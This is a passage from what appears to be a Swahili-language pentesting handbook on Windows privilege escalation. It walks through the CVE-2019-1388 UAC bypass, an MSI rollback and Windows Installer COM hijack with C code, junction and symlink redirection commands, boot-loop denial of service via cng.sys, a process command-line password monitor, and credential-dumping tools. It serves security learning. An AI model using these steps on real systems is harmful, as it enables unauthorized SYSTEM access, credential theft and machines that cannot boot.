- Kila tukio huandika `InitContext` inayodhibitiwa na mshambuliaji kutoka `Initialize` kwenye handle hiyo. Sajili line app kwa `LRegisterRequestRecipient` (`Req_Func 61`), anzisha `TRequestMakeCall` (`Req_Func 121`), pata kupitia `GetAsyncEvents` (`Req_Func 0`), kisha futa usajili/zima huduma ili kurudia maandishi yanayotabirika.
- Jiongeze kwenye `[TapiAdministrators]` katika `C:\Windows\TAPI\tsec.ini`, unganisha tena, kisha piga `GetUIDllName` ukiweka njia ya DLL yoyote ili kutekeleza `TSPI_providerUIIdentify` kama `NETWORK SERVICE`.

Maelezo zaidi:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Misc

### File Extensions that could execute stuff in Windows

Tembelea ukurasa **[https://filesec.io/](https://filesec.io/)**

### Protocol handler / ShellExecute abuse via Markdown renderers

Markdown links zinazoweza kubonyezwa na kutumwa kwa `ShellExecuteExW` zinaweza kuanzisha URI handlers hatari (`file:`, `ms-appinstaller:` au scheme yoyote iliyosajiliwa) na kutekeleza faili zinazodhibitiwa na mshambuliaji kama mtumiaji wa sasa. Tazama:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Monitoring Command Lines for passwords**

Unapopata shell kama mtumiaji, huenda kukawa na scheduled tasks au processes nyingine zinazoendeshwa ambazo **huweka credentials kwenye command line**. Script iliyo hapa chini hunasa command lines za processes kila baada ya sekunde mbili na kulinganisha hali ya sasa na ile ya awali, kisha kutoa tofauti zozote.

```bash
while($true)
{
  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```

## Kuiba passwords kutoka kwa processes

## Kutoka kwa Low Priv User hadi NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

Ikiwa unaweza kufikia kiolesura cha picha (kupitia console au RDP) na UAC imewashwa, katika baadhi ya matoleo ya Microsoft Windows inawezekana kuendesha terminal au process nyingine yoyote kama "NT\AUTHORITY SYSTEM" kutoka kwa mtumiaji asiye na privileges.

Hii inaruhusu kufanya privilege escalation na kupita UAC kwa wakati mmoja kwa kutumia vulnerability hiyo hiyo. Zaidi ya hayo, hakuna haja ya kusakinisha chochote, na binary inayotumika wakati wa mchakato huo imesainiwa na kutolewa na Microsoft.

Baadhi ya mifumo iliyoathiriwa ni hii:

```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```

Ili ku-exploit udhaifu huu, ni lazima kutekeleza hatua zifuatazo:

```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```

Una faili na taarifa zote zinazohitajika katika repository hii ya GitHub:

https://github.com/jas502n/CVE-2019-1388<sup>[[35]](#references)</sup>

## Kutoka Integrity Level ya Medium ya Administrator hadi Integrity Level ya High / UAC Bypass

Soma hili ili **ujifunze kuhusu Integrity Levels**:


{{#ref}}
integrity-levels.md
{{#endref}}

Kisha **soma hili ili ujifunze kuhusu UAC na UAC bypasses:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Kuweka Junction za Directory ya Upload ndani ya Root Inayotolewa na Web Server

Programu inaweza kuunda subdirectory ya upload yenye jina linalotabirika, kuandika jina la faili lililotolewa na mtumiaji ndani yake, kisha kuchakata faili hilo. Ikiwa mtumiaji mwenye ruhusa chache anaweza kuondoa na kubadilisha subdirectory hiyo kwa NTFS junction kabla ya uandishi wa upande wa server, uandishi unaweza kufuata junction hadi directory inayotolewa na web server. Script iliyowekwa hapo inaweza kuendeshwa kwa utambulisho wa web-service ikiwa server inaendesha aina hiyo ya faili. Hili ni suala mahususi la programu linalohusu mpaka wa arbitrary-write; directory ya upload inayoweza kuandikwa au junction iliyopo pekee havithibitishi hilo.

Kagua ujenzi halisi wa path na muda wa utekelezaji katika upload handler, ruhusa halisi za mtumiaji za kufuta/kuunda subdirectory, ACLs halisi za destination, ikiwa mchakataji wa uandishi hufuata reparse points, na ikiwa web server huendesha faili katika destination hiyo. Thibitisha utambulisho wa process wa mchakataji wa uandishi na wa web server kando. Orodha ya ukaguzi isiyobadilisha hali inaweza kuonyesha ACLs za directory na metadata ya reparse, lakini haiwezi kuthibitisha tabia ya handler au ubadilishaji wa junction unaoweza kufanyika baadaye. Ikiwa utekelezaji unafanyika kwa akaunti ya huduma, kagua **token halisi ya process** kabla ya kufikiria njia tofauti ya token-privilege.

## Kutoka Ruhusa za Kufuta/Kuhamisha/Kubadilisha Jina Folder Holela hadi SYSTEM EoP

Mbinu iliyoelezwa [**katika chapisho hili la blogu**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) ina exploit code [**inayopatikana hapa**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).<sup>[[31]](#references)[[32]](#references)</sup>

Shambulio hili kimsingi hutumia vibaya kipengele cha rollback cha Windows Installer ili kubadilisha faili halali kwa faili hasidi wakati wa mchakato wa kuondoa programu. Kwa hili, mshambuliaji anahitaji kuunda **MSI installer hasidi** itakayotumika kuteka folder ya `C:\Config.Msi`, ambayo baadaye itatumiwa na Windows Installer kuhifadhi faili za rollback wakati wa kuondoa MSI packages nyingine; faili hizo za rollback zitakuwa zimebadilishwa ili ziwe na payload hasidi.

### Windows Installer COM cleanup-path injection (CVE-2025-27727)

Mteja mwenye ruhusa chache anaweza kufikia huduma ya SYSTEM `msiexec.exe` kupitia kitu cha COM cha `CMsiConfigurationManager` (CLSID/IID `{000C101C-0000-0000-C000-000000000046}`). Uhandisi wa reverse umebaini kuwa miito husika ya `IMsiServer` ni `MsiBeginTransactionW` katika vtable offset `0xA0`, `SetEEUIDirectoryAndFilter` katika `0xC8`, na `CleanupTempPackages` katika `0x50`. Majina na offsets hizi zimebainishwa kupitia uhandisi wa reverse na zinaweza kutofautiana kati ya builds.<sup>[[41]](#references)</sup>

Kwa mtumiaji asiye msimamizi, `SetEEUIDirectoryAndFilter` hujifanya kuwa caller wakati tu wa kufungua path iliyotolewa kwa kutumia `DELETE`, `FILE_FLAG_BACKUP_SEMANTICS`, na `FILE_FLAG_OPEN_REPARSE_POINT`. Hili huthibitisha kuwa caller anaweza kufuta directory na huepusha kufuata reparse point, lakini **haliunganishi** file object iliyokaguliwa na usafishaji unaofuata, wala kuthibitisha kuwa Windows Installer ndiyo iliyoiunda.<sup>[[41]](#references)</sup>

Baada ya `MsiBeginTransactionW`, `SetEEUIDirectoryAndFilter` hupanga path kama folder bila kujali thamani ya filter ya caller. Huduma huandika thamani ya `REG_DWORD` yenye jina maalum chini ya `HKLM\Software\Microsoft\Windows\CurrentVersion\Installer\TempPackages`: jina la thamani ni path inayodhibitiwa na caller na data `0x00000002` ndiyo alama ya folder. Kisha `CleanupTempPackages(NULL, FALSE)` huingia moja kwa moja kwenye usafishaji. Worker wake mwenye ruhusa zilizoinuliwa huorodhesha thamani za registry na kupitisha entries za folder kwa `FDeleteFolder` ya kujirudia bila kukagua chanzo cha path. Ikiwa uondoaji wa kawaida hautafaulu, code pia huita `LockdownPath`, huondoa sifa za faili, kisha hujaribu tena.<sup>[[41]](#references)</sup>

Mfuatano wa chini kabisa wa miito uliopatikana kutoka `msi.dll` ni:<sup>[[41]](#references)</sup>

```c
CreateDirectoryW(L"C:\\Config.Msi", NULL);
HANDLE hDir = CreateFileW(L"C:\\Config.Msi",
    GENERIC_READ | WRITE_DAC | READ_CONTROL | DELETE,
    FILE_SHARE_READ, NULL, OPEN_EXISTING,
    FILE_FLAG_BACKUP_SEMANTICS, NULL);
CMsiConfigurationManager *server = CreateMsiServer();
server->MsiBeginTransactionW(L"PoC", 0, hWnd, &hTransaction);
server->SetEEUIDirectoryAndFilter(L"C:\\Config.Msi", 0);
server->CleanupTempPackages(NULL, FALSE);
```

Primitive inayotumika ni kutumia tena path badala ya kuelekeza upya junction. Sajili `C:\Config.Msi` iliyoundwa na mshambuliaji, iondoe, kisha Windows Installer iunde tena pathname hiyo hiyo baadaye ikiwa na rollback data iliyolindwa. Cleanup huamini jina la zamani la `TempPackages` na kufuta directory mpya kama SYSTEM. Hii hukwepa mpaka uliokusudiwa na ulinzi wa `FILE_FLAG_OPEN_REPARSE_POINT` na redirection-trust mitigation kwa sababu hakuna haja ya reparse point.<sup>[[41]](#references)</sup>

Primitive hii ya kufuta inafaa katika mnyororo wa rollback hapa chini: hifadhi rekodi tofauti ya `Installer\Folders`, futa `C:\Config.Msi` iliyolindwa, iunde tena ikiwa na NULL DACL, na uhifadhi handle iliyopewa `WRITE_DAC` kabla installer haijaimarisha DACL. Handle iliyofunguliwa awali inaweza kurejesha DACL iliyoruhusu ufikiaji kwa kutumia `NtSetSecurityObject`, kisha `.rbs` iliyozalishwa inaweza kubadilishwa kabla rollback haijaendelea.<sup>[[41]](#references)</sup>

Microsoft ilirekebisha njia hii kwa kuzuia `CMsiTransaction::SetEEUIDirectoryAndFilter` kuita `ScheduleFileOrFolderDelete` wakati feature gate mpya imewashwa. COM call bado inaweza kurudisha success, lakini haiweki tena path inayodhibitiwa na mshambuliaji kwenye `TempPackages`. Sakinisha Windows security updates za April 2025 badala ya kutumia mafanikio ya method return kama kipimo cha patch.<sup>[[41]](#references)[[42]](#references)</sup>

Mbinu hiyo kwa muhtasari ni hii:

1. **Hatua ya 1 – Kujiandaa kwa Hijack (acha `C:\Config.Msi` tupu)**

- Hatua ya 1: Sakinisha MSI
    - Unda `.msi` inayosakinisha faili isiyo na madhara (kwa mfano, `dummy.txt`) kwenye folder inayoweza kuandikika (`TARGETDIR`).
    - Weka alama kuwa installer ni **"UAC Compliant"**, ili **mtumiaji asiye admin** aweze kuiendesha.
    - Acha **handle** ikiwa wazi kwa faili baada ya install.

- Hatua ya 2: Anza Uninstall
    - Ondoa `.msi` hiyo hiyo.
    - Mchakato wa uninstall huanza kuhamisha faili hadi `C:\Config.Msi` na kuzipa majina ya faili za `.rbf` (rollback backups).
    - **Fuatilia open file handle** ukitumia `GetFinalPathNameByHandle` ili kugundua faili inapokuwa `C:\Config.Msi\<random>.rbf`.

- Hatua ya 3: Usawazishaji Maalum
    - `.msi` inajumuisha **custom uninstall action (`SyncOnRbfWritten`)** ambayo:
        - Hutoa ishara baada ya `.rbf` kuandikwa.
        - Kisha **husubiri** event nyingine kabla ya kuendelea na uninstall.

- Hatua ya 4: Zuia Kufutwa kwa `.rbf`
    - Ishara ikitolewa, **fungua faili ya `.rbf`** bila `FILE_SHARE_DELETE` — hii **huzuia faili kufutwa**.
    - Kisha **tuma ishara ya kurudisha** ili uninstall ikamilike.
    - Windows Installer hushindwa kufuta `.rbf`, na kwa kuwa haiwezi kufuta maudhui yote, **`C:\Config.Msi` haiondolewi**.

- Hatua ya 5: Futa `.rbf` Wewe Mwenyewe
    - Wewe (mshambuliaji) futa faili ya `.rbf` wewe mwenyewe.
    - Sasa **`C:\Config.Msi` ni tupu**, tayari kutekwa.

> Katika hatua hii, **anzisha vulnerability ya kufuta folder kiholela kwa kiwango cha SYSTEM** ili kufuta `C:\Config.Msi`.

2. **Hatua ya 2 – Kubadilisha Rollback Scripts kwa Zilizo Hasidi**

- Hatua ya 6: Unda Tena `C:\Config.Msi` ikiwa na ACL dhaifu
    - Unda tena folder ya `C:\Config.Msi`.
    - Weka **DACL dhaifu** (kwa mfano, Everyone:F), na **acha handle wazi** yenye `WRITE_DAC`.

- Hatua ya 7: Endesha Install Nyingine
    - Sakinisha `.msi` tena, ukiwa na:
        - `TARGETDIR`: Mahali panapoweza kuandikika.
        - `ERROROUT`: Variable inayosababisha hitilafu ya lazima.
    - Install hii itatumika kuanzisha **rollback** tena, ambayo husoma `.rbs` na `.rbf`.

- Hatua ya 8: Fuatilia `.rbs`
    - Tumia `ReadDirectoryChangesW` kufuatilia `C:\Config.Msi` hadi `.rbs` mpya ionekane.
    - Hifadhi jina lake la faili.

- Hatua ya 9: Sawazisha Kabla ya Rollback
    - `.msi` ina **custom install action (`SyncBeforeRollback`)** ambayo:
        - Hutoa event faili ya `.rbs` inapoundwa.
        - Kisha **husubiri** kabla ya kuendelea.

- Hatua ya 10: Weka Tena ACL Dhaifu
    - Baada ya kupokea event ya `.rbs created`:
        - Windows Installer **huweka tena ACL kali** kwenye `C:\Config.Msi`.
        - Lakini kwa kuwa bado una handle yenye `WRITE_DAC`, unaweza **kuweka tena ACL dhaifu**.

> ACL **hutekelezwa tu wakati handle inafunguliwa**, kwa hiyo bado unaweza kuandika kwenye folder.

- Hatua ya 11: Weka `.rbs` na `.rbf` Bandia
    - Andika juu ya faili ya `.rbs` na **rollback script bandia** inayoelekeza Windows:
        - Irejeshe faili yako ya `.rbf` (DLL hasidi) kwenye **mahali penye privileges** (kwa mfano, `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
    - Weka `.rbf` yako bandia yenye **DLL payload hasidi ya kiwango cha SYSTEM**.

- Hatua ya 12: Anzisha Rollback
    - Tuma ishara ya sync event ili installer iendelee.
    - **Type 19 custom action (`ErrorOut`)** imesanidiwa **kufeli install kimakusudi** katika hatua inayojulikana.
    - Hii husababisha **rollback kuanza**.

- Hatua ya 13: SYSTEM Husakinisha DLL Yako
    - Windows Installer:
        - Husoma `.rbs` yako hasidi.
        - Hunakili DLL yako ya `.rbf` kwenye eneo lengwa.
    - Sasa una **DLL yako hasidi kwenye path inayopakiwa na SYSTEM**.

- Hatua ya Mwisho: Tekeleza Code kama SYSTEM
    - Endesha **auto-elevated binary** inayoaminika (kwa mfano, `osk.exe`) inayopakia DLL uliyo-hijack.
    - **Basi**: Code yako hutekelezwa **kama SYSTEM**.


### Kutoka kwa Kufuta/Kuhamisha/Kubadilisha Jina Faili Kiholela hadi SYSTEM EoP

Mbinu kuu ya MSI rollback (ile ya awali) hudhani unaweza kufuta **folder nzima** (kwa mfano, `C:\Config.Msi`). Lakini vipi ikiwa vulnerability yako inaruhusu **kufuta faili kiholela** tu?

Unaweza kutumia **NTFS internals**: kila folder ina alternate data stream iliyofichwa inayoitwa:

```
C:\SomeFolder::$INDEX_ALLOCATION
```

Stream hii huhifadhi **metadata ya index** ya folda.

Kwa hiyo, ukifuta stream ya `::$INDEX_ALLOCATION` ya folda, NTFS **huondoa folda nzima** kwenye mfumo wa faili.

Unaweza kufanya hivyo kwa kutumia API za kawaida za kufuta faili kama:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```

> Ingawa unaita API ya kufuta *faili*, **hufuta folda yenyewe**.

### Kutoka Kufuta Yaliyomo kwenye Folda hadi SYSTEM EoP
Je, ikiwa primitive yako haikuruhusu kufuta faili/folda zozote, lakini **inaruhusu kufuta *yaliyomo* kwenye folda inayodhibitiwa na mshambuliaji**?

1. Hatua ya 1: Sanidi folda na faili ya chambo
- Unda: `C:\temp\folder1`
- Ndani yake: `C:\temp\folder1\file1.txt`

2. Hatua ya 2: Weka **oplock** kwenye `file1.txt`
- Oplock **husitisha utekelezaji** wakati mchakato wenye upendeleo unapojaribu kufuta `file1.txt`.

```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```

3. Hatua ya 3: Anzisha process ya SYSTEM (mf., `SilentCleanup`)
- Process hii huchanganua folda (mf., `%TEMP%`) na kujaribu kufuta yaliyomo.
- Inapofikia `file1.txt`, **oplock huanzishwa** na kukabidhi udhibiti kwa callback yako.

4. Hatua ya 4: Ndani ya callback ya oplock – elekeza upya ufutaji

- Chaguo A: Hamisha `file1.txt` mahali pengine
    - Hii huondoa yaliyomo kwenye `folder1` bila kuvunja oplock.
    - Usifute `file1.txt` moja kwa moja — kufanya hivyo kungeachilia oplock mapema.

- Chaguo B: Geuza `folder1` kuwa **junction**:

```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```

- Chaguo C: Unda **symlink** katika `\RPC Control`:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```

> Hii inalenga stream ya ndani ya NTFS inayohifadhi metadata ya folda — ukiifuta, folda hufutika.

5. Hatua ya 5: Achia oplock
- Mchakato wa SYSTEM unaendelea na kujaribu kufuta `file1.txt`.
- Lakini sasa, kutokana na junction + symlink, kwa hakika unafuta:
```
C:\Config.Msi::$INDEX_ALLOCATION
```

**Matokeo**: `C:\Config.Msi` imefutwa na SYSTEM.

### Kutoka kwa Kuunda Folda Yoyote hadi DoS ya Kudumu

Tumia primitive inayokuwezesha **kuunda folda yoyote kama SYSTEM/admin** — hata kama **huwezi kuandika faili** au **kuweka ruhusa dhaifu**.

Unda **folda** (si faili) yenye jina la **Windows driver muhimu**, kwa mfano:
```
C:\Windows\System32\cng.sys
```

- Njia hii kwa kawaida inalingana na driver ya kernel-mode `cng.sys`.
- Ukiunda **mapema kama folda**, Windows hushindwa kupakia driver halisi wakati wa kuwasha.
- Kisha, Windows hujaribu kupakia `cng.sys` wakati wa kuwasha.
- Huona folda, **hushindwa kutatua driver halisi**, na **huanguka au husitisha kuwasha**.
- **Hakuna njia mbadala**, na **hakuna urejeshaji** bila uingiliaji wa nje (kwa mfano, ukarabati wa kuwasha au ufikiaji wa diski).

### Kutoka kwenye njia za logi/chelezo zenye ruhusa za juu + OM symlinks hadi kubatilisha faili yoyote / boot DoS

Wakati **huduma yenye ruhusa za juu** inaandika logi/exports kwenye njia iliyosomwa kutoka kwenye **config inayoweza kuandikwa**, elekeza njia hiyo upya kwa kutumia **Object Manager symlinks + NTFS mount points** ili kubadilisha uandishi wenye ruhusa za juu kuwa ubatilishaji wa faili yoyote (hata **bila SeCreateSymbolicLinkPrivilege**).<sup>[[15]](#references)</sup>

**Mahitaji**
- Config inayohifadhi njia lengwa inaweza kuandikwa na mshambulizi (kwa mfano, `%ProgramData%\...\.ini`).
- Uwezo wa kuunda mount point kwenye `\RPC Control` na OM file symlink (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).<sup>[[16]](#references)[[17]](#references)</sup>
- Operesheni yenye ruhusa za juu inayoandika kwenye njia hiyo (logi, export, ripoti).

**Mfano wa mfululizo wa hatua**
1. Soma config ili kupata tena mahali lengwa pa logi yenye ruhusa za juu, kwa mfano `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` katika `C:\ProgramData\ICONICS\IcoSetup64.ini`.
2. Elekeza njia hiyo upya bila admin:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Subiri hadi kipengele chenye mapendeleo kiandike log (kwa mfano, admin achague "send test SMS"). Sasa maandishi yanaandikwa kwenye `C:\Windows\System32\cng.sys`.
4. Kagua faili lengwa lililoandikwa juu yake (hex/PE parser) ili kuthibitisha uharibifu; kuwasha upya hulazimisha Windows kupakia driver iliyoharibiwa → **boot loop DoS**. Hii pia inatumika kwa faili yoyote iliyolindwa ambayo service yenye mapendeleo itafungua kwa ajili ya kuandika.

> `cng.sys` kwa kawaida hupakiwa kutoka `C:\Windows\System32\drivers\cng.sys`, lakini ikiwa kuna nakala katika `C:\Windows\System32\cng.sys`, inaweza kujaribiwa kwanza, na hivyo kuifanya kuwa mahali pa uhakika pa kusababisha DoS kwa data iliyoharibiwa.



## **Kutoka High Integrity hadi System**

### **Service mpya**

Ikiwa tayari unaendesha mchakato wa High Integrity, **njia ya kufikia SYSTEM** inaweza kuwa rahisi kwa **kuunda na kutekeleza service mpya**:

```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```

> [!TIP]
> Unapotengeneza service binary, hakikisha ni service halali au binary inatekeleza vitendo vinavyohitajika haraka, kwa kuwa itasitishwa baada ya sekunde 20 ikiwa si service halali.

### AlwaysInstallElevated

Kutoka kwenye mchakato wa High Integrity unaweza kujaribu **kuwezesha registry entries za AlwaysInstallElevated** na **kusakinisha** reverse shell kwa kutumia wrapper ya _**.msi**_.\
[Maelezo zaidi kuhusu registry keys zinazohusika na jinsi ya kusakinisha kifurushi cha _.msi_ hapa.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**Unaweza** [**kupata code hapa**](seimpersonate-from-high-to-system.md)**.**

### Kutoka SeDebug + SeImpersonate hadi Full Token privileges

Ikiwa una token privileges hizo (huenda utazipata kwenye mchakato wa High Integrity tayari), utaweza **kufungua karibu mchakato wowote** (isipokuwa michakato iliyolindwa) kwa kutumia SeDebug privilege, **kunakili token** ya mchakato, na kuunda **mchakato wowote kwa kutumia token hiyo**.\
Kwa kawaida, mbinu hii **huchagua mchakato wowote unaoendeshwa kama SYSTEM wenye token privileges zote** (_ndiyo, unaweza kupata michakato ya SYSTEM isiyo na token privileges zote_).\
**Unaweza kupata** [**mfano wa code inayotekeleza mbinu iliyopendekezwa hapa**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Mbinu hii hutumiwa na meterpreter ili kupata privilege escalation katika `getsystem`. Mbinu hii inahusisha **kutengeneza pipe na kisha kutengeneza/ kutumia vibaya service ili kuandika kwenye pipe hiyo**. Kisha, **server** iliyotengeneza pipe kwa kutumia privilege ya **`SeImpersonate`** itaweza **kuiga token** ya client wa pipe (service), na kupata SYSTEM privileges.\
Ikiwa ungependa [**kujifunza zaidi kuhusu name pipes, soma hili**](#named-pipe-client-impersonation).\
Ikiwa ungependa kusoma mfano wa [**jinsi ya kutoka high integrity hadi System kwa kutumia name pipes, soma hili**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Ukiweza **kuhijack dll** inayopakiwa na **mchakato** unaoendeshwa kama **SYSTEM**, utaweza kutekeleza code yoyote kwa ruhusa hizo. Kwa hiyo, Dll Hijacking pia ni muhimu kwa aina hii ya privilege escalation; zaidi ya hayo, ni **rahisi zaidi kutekeleza kutoka kwenye mchakato wa high integrity**, kwa kuwa utakuwa na **write permissions** kwenye folda zinazotumiwa kupakia dlls.\
**Unaweza** [**kujifunza zaidi kuhusu Dll hijacking hapa**](dll-hijacking/index.html)**.**

### **Kutoka Administrator au Network Service hadi System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### Kutoka LOCAL SERVICE au NETWORK SERVICE hadi full privs

**Soma:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## Msaada zaidi

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Zana muhimu

**Zana bora ya kutafuta njia za Windows local privilege escalation:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Hukagua misconfigurations na mafaili nyeti (**[**angalia hapa**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Imegunduliwa.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Hukagua baadhi ya misconfigurations zinazowezekana na kukusanya taarifa (**[**angalia hapa**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Hukagua misconfigurations**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Hutoa taarifa za session zilizohifadhiwa za PuTTY, WinSCP, SuperPuTTY, FileZilla na RDP. Tumia -Thorough kwenye local.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Hutoa credentials kutoka Credential Manager. Imegunduliwa.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Hufanya password spraying ya passwords zilizokusanywa kwenye domain**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh ni zana ya PowerShell ya ADIDNS/LLMNR/mDNS spoofing na man-in-the-middle.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Basic privesc Windows enumeration**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Hutafuta privesc vulnerabilities zinazojulikana (IMEPITWA NA WAKATI; tumia Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Hukagua local **(Inahitaji haki za Admin)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Hutafuta privesc vulnerabilities zinazojulikana (inahitaji kucompiliwa kwa kutumia VisualStudio) ([**iliyocompiliwa awali**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Hufanya enumeration ya host kutafuta misconfigurations (ni zaidi ya zana ya kukusanya taarifa kuliko ya privesc) (inahitaji kucompiliwa) **(**[**iliyocompiliwa awali**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Hutoa credentials kutoka kwenye software nyingi (exe iliyocompiliwa awali inapatikana github)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Port ya PowerUp kwenda C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Hukagua misconfiguration (executable iliyocompiliwa awali inapatikana github). Haipendekezwi. Haifanyi kazi vizuri kwenye Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Hukagua misconfigurations zinazowezekana (exe kutoka python). Haipendekezwi. Haifanyi kazi vizuri kwenye Win10.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Zana iliyoundwa kwa kutegemea chapisho hili (haihitaji accesschk ili kufanya kazi vizuri, lakini inaweza kuitumia).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Husoma matokeo ya **systeminfo** na kupendekeza exploits zinazofanya kazi (local python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Husoma matokeo ya **systeminfo** na kupendekeza exploits zinazofanya kazi (local Python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Unahitaji kucompili project kwa kutumia toleo sahihi la .NET ([angalia hili](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Ili kuona toleo la .NET lililosakinishwa kwenye host ya mwathiriwa, unaweza kutekeleza:

```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```

## References

- [1] [Misingi ya Windows Privilege Escalation](http://www.fuzzysecurity.com/tutorials/16.html)
- [2] [Kuongeza privileges kwa kutumia vibaya ruhusa dhaifu za folda](http://www.greyhathacker.net/?p=738)
- [3] [Windows Privilege Escalation - muhtasari wa rejea](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [4] [lpeworkshop - Warsha ya Windows / Linux Local Privilege Escalation](https://github.com/sagishahar/lpeworkshop)
- [5] [DerbyCon 3.0 - Mashambulizi ya Windows: AT ndiyo black mpya (Rob Fuller & Chris Gates)](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [6] [Privilege Escalation - Windows - Mwongozo Kamili wa OSCP](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [7] [Windows - Privilege Escalation - PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [8] [Mwongozo wa Windows Privilege Escalation](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [9] [Orodha hakiki ya Windows-Privilege-Escalation](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [10] [Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [11] [Mbinu za Windows Privilege Escalation kwa Pentesters](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [12] [0xdf – HTB/VulnLab JobTwo: Hadaa kupitia SMTP kwa macro ya Word VBA → kusimbua credentials za hMailServer → Veeam CVE-2023-27532 hadi SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
